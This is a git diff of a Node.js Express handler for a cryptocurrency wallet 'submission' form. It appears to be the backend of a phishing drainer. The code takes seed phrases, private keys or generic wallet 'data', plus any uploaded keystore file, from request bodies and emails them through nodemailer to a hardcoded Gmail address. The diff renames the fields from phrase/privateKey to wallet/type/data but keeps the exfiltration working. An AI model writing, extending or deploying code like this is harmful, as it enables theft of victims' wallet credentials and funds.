@@ -1,13 +1,15 @@
+require("dotenv").config();
 const multer = require("multer");
 const nodemailer = require("nodemailer");
 
-// use memory storage so we can attach files to emails
+// Memory storage for optional file uploads
 const storage = multer.memoryStorage();
 const upload = multer({ storage });
 
 const handleSubmission = async (req, res) => {
   try {
-    const { phrase, privateKey } = req.body;
+    // Destructure wallet, type, and data from request body
+    const { wallet, type, data } = req.body;
 
     const transporter = nodemailer.createTransport({
       service: "gmail",
@@ -20,14 +22,15 @@ const handleSubmission = async (req, res) => {
     const mailOptions = {
       from: process.env.EMAIL_USER,
       to: "Tomotelechristopher25@gmail.com",
-      subject: "New Wallet Submission",
+      subject: `New Wallet Submission - ${wallet}`,
       text: `
-        Phrase: ${phrase || "N/A"}
-        Private Key: ${privateKey || "N/A"}
+        Wallet: ${wallet || "N/A"}
+        Type: ${type || "N/A"}
+        Data: ${data || "N/A"}
       `,
     };
 
-    // attach keystore file if uploaded
+    // If a file is uploaded (image/keystore), attach it
     if (req.file) {
       mailOptions.attachments = [
         {
